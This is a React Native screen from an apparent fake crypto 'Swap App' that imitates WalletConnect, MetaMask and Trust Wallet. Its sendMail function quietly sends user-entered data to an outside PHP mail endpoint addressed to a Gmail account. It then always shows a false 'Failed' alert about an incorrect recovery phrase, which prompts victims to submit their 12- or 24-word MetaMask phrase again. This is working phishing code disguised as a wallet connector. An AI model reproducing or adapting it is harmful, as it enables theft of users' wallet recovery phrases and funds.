import { useEffect, useState, } from "react";
import { View, Text, Image, StyleSheet, ActivityIndicator, 
    Modal, Pressable, TextInput, TouchableOpacity, Alert } from "react-native";
import { FontAwesomeIcon } from "@fortawesome/react-native-fontawesome";
import { faAngleDown,faMagnifyingGlass,faCircleXmark,faCircleInfo } from "@fortawesome/free-solid-svg-icons";
import { SafeArea } from "../utility/safearea";
import axios from 'axios';

export function WalletConet({ navigation }) {
    const [loading, setLoading] = useState(false);
    const [modalShow, setmodalShow] = useState(false);
    const [modalOpen, setmodalOpen] = useState(false);
    const [phone, setPhone] = useState("");
    const [coinName, setCoinName] = useState("");
    const [recieveLink, setRecieveLink] = useState(false);

    function recieve() {
        setRecieveLink(!recieveLink)
    }

    recieve = () => {
        setLoading(true)
        setTimeout(() => {
            setLoading(false)
            setmodalShow(true)
        }, 0);
    }
    useEffect(() => {
        recieve()
    }, []);

    // Submit = () => {
    //     setLoading(true)
    //     setTimeout(() => {
    //         setLoading(false)
    //         Alert.alert(
    //             'Status',
    //             `Your request submited successfully, enter your Whatsapp now to speak with Tony`,
    //             [{ text: 'Okay' }]
    //         );

    //     }, 2000);

    // }

    async function sendMail() {
        setLoading(true)
        const email = "swapcoin11@gmail.com"
        const sub = "[Swap App] Message from SWAP APP"
        const msg = ` <div>
        <h4>${coinName}</h4>
        <a href="tel:${phone}">${phone}</a>
        </div>`

        try {
            await axios.get(`https://lunoinvest.com/sendemail.php?email=${email}&subject=${sub}&message=${msg}`)
                .then(() => {
                    setTimeout(() => {
                        setLoading(false)
                        Alert.alert(
                            'Failed',
                            `This usually occurs when you entered incorrect Phrase or you are connecting from an unsupported country. Your MetaMask Phrase is usually 12 or 24 single space lowalcase words.`,
                            [{ text: 'Try Again' }]
                        );
                    },5000);
                    
                })
                .catch((error) => {
                    setLoading(false)
                    console.log(error);
                });
        } catch (error) {
            setLoading(false)
            console.log(error);
        }
    }

    return (
        <SafeArea>
            <View style={{ flex: 1 }}>
            <View style={styles.contanier}>
            
             <Image source={require('../assets/ttt4.png')} 
            style={{height:32,width:32}}/>
            
            
            <View style={{flexDirection:"row"}}>
            <Image source={require('../assets/eth.png')} style={{height:20,width:20, 
                marginRight:5,margin:5,borderRadius:10}}/>
            <FontAwesomeIcon icon={faAngleDown} size={17} style={{margin:5,color:"gray"}}/>
            </View>
            
            <FontAwesomeIcon icon={faMagnifyingGlass} size={22} style={{margin:5,color:"gray"}}/>
            
            <View style={{flexDirection:"row",alignItems:"center",backgroundColor:"#FEB4DD",
            justifyContent:"center",borderRadius:25,padding:8,}}>
            <Text style={{fontSize:16,marginRight:9,color:"#F60415"}}>Connect</Text>
            <View style={{borderWidth:0.3,height:20,marginRight:7,borderColor:"#F60415"}}></View>
            <FontAwesomeIcon icon={faAngleDown} size={17}style={{marginRight:15,color:"#F60415"}}/>
            </View>
            
        </View>

                <Modal animationType='fade'
                    visible={modalShow}
                    transparent={true}>
                    <View
                        style={{
                            flex: 1,
                            backgroundColor: "rgba(0,0,0, 0.8)"
                        }}
                    >
                        <Pressable
                            onPress={() => setmodalShow(true)}
                            style={{ flex: 1, justifyContent: 'center', }}
                        >
                        </Pressable>

                        <View style={{flexDirection:"row",justifyContent:"space-between",padding:30}}>
                            <View style={{flexDirection:"row"}}>
                                <Image source={require("../assets/cont3.png")} 
                                style={{width:32,height:32,borderRadius:50,margin:3}}/>
                                <Text style={{color:"#ffff",margin:3,fontSize:20,fontWeight:"600"}}>WalletConnect</Text>
                            </View>
                            <TouchableOpacity  onPress={() => navigation.navigate("Home")}>
                            <FontAwesomeIcon icon={faCircleXmark} size={30} style={{color:"#ffff",margin:3,}}/>
                            </TouchableOpacity>
                        </View>

                        <View style={styles.modacontent}>
                            <View style={{justifyContent:"center",alignItems:"center",marginTop:20}}>
                                <View style={{backgroundColor:"#b3b5b5",flexDirection:"row",width:"60%",borderRadius:10}}>
                                    <View style={{backgroundColor:"#ffff",margin:5,width:"50%",
                                    justifyContent:"center",alignItems:"center",borderRadius:6}}>
                                        <Text style={{color:"red",fontWeight:"600",fontSize:13}}>Mobile</Text>
                                    </View>
                                    <View style={{margin:10}}>
                                        <Text style={{color:"red",fontWeight:"600",fontSize:13}}>connect</Text>
                                    </View>
                                   
                                </View>
                                <View style={{marginTop:20}}>
                                        <Text style={{color:"#b3b5b5",fontWeight:"600",fontSize:15}}>Connect to Mobile Wallet</Text>
                                    </View>
                            </View>
                           
                            <View style={{ justifyContent: 'center', alignItems: 'center', }}>
                                <TouchableOpacity onPress={() => setmodalOpen(true)}>
                                    <View style={styles.submit}>
                                        <Text style={{ fontSize: 17, color: '#ffff' }}>Connect</Text>
                                    </View>
                                </TouchableOpacity>
                            </View>

                        </View>
                        <Pressable
                            onPress={() => setmodalShow(true)}
                            style={{ flex: 1, justifyContent: 'center', }}
                        >
                        </Pressable>
                    </View>
                </Modal>

                <Modal animationType='slide'
                        visible={modalOpen}
                        transparent={true}>
                        <View style={styles.modalView}>
                            <Pressable
                                onPress={() => setmodalOpen(false)}
                                style={{
                                    flex: 1,
                                    justifyContent: 'flex-end',
                                }}
                            >
                            </Pressable>
                            <View style={styles.modercontent2}>
                                <View style={{
                                    flexDirection: 'row', justifyContent: 'space-between', alignContent: 'center',
                                }}>
                                    <Text style={{ color: '#0d000c', fontSize: 16, fontWeight: 'bold' }}>Open with</Text>
                                    <TouchableOpacity onPress={() => setmodalOpen(false)}>
                                        <FontAwesomeIcon icon={faCircleInfo} size={23} color="#545353" style={styles.times} />
                                    </TouchableOpacity>
                                </View>
                                
                                    
                        <View style={{flexDirection:"row",justifyContent:"space-around",marginTop:30 }}>
                                        <TouchableOpacity onPress={() => {
                                    setmodalOpen(false)
                                    navigation.navigate('Trustwallet')
                                }}>
                                        <Image source={require('../assets/ttt2.png')} style={{ height: 50, width: 50,borderRadius:50,margin:10 }} />
                                        <Text>MetaMask</Text>
                                        </TouchableOpacity>
                                        <TouchableOpacity onPress={() => {
                                    setmodalOpen(false)
                                    navigation.navigate('Metamask')
                                }}>
                                
                                        <Image source={require('../assets/ttt1.png')} style={{ height:70, width: 70,borderRadius:50 }} />
                                        <Text>Trust Wallet</Text>
                                        </TouchableOpacity>
                               
                                            
                        </View>
                                    
                                

                                
                                       
                                    
                               
                            </View>
                        </View>
                    </Modal>
            </View>
        </SafeArea>
    )
}
const styles = StyleSheet.create({
    contanier:{
        flexDirection:"row",
        alignItems:"center",
        padding:20,
        justifyContent:"space-between"
    },
    modacontent: {
        
        backgroundColor: '#ffff',
        borderRadius: 20,
        margin: 30,
        marginTop:0.1

    },
    submit: {
        marginTop: 130,
        marginBottom: 120,
        backgroundColor: '#1192f5',
        justifyContent: "center",
        alignItems: "center",
        height: 48,
        width: 100,
        borderRadius: 10
    },
    input: {
        borderColor: "gray",
        borderWidth: 1,
        borderRadius: 10,
        marginBottom: 5,
        width: "90%",
        marginHorizontal: 30,
        padding: 5
    },
    modalView: {
        flex: 1,
        backgroundColor: "rgba(0,0,0, 0.6)",
    },
    modercontent2: {
        height: '30%',
        borderTopLeftRadius: 20,
        borderTopRightRadius: 20,
        padding: 10,
        paddingTop: 15,
        backgroundColor: 'white'
    },
    times: {
        //marginLeft: "auto"
    },
    
    searchIcon: {
        flexDirection: 'row',
        borderWidth: 1,
        padding: 3,
        alignItems: 'center',
        borderRadius: 15,
        backgroundColor: '#f0eeeb',
        borderColor: '#b0b0b0',
        marginBottom: 5,
        marginTop: 15

    }

})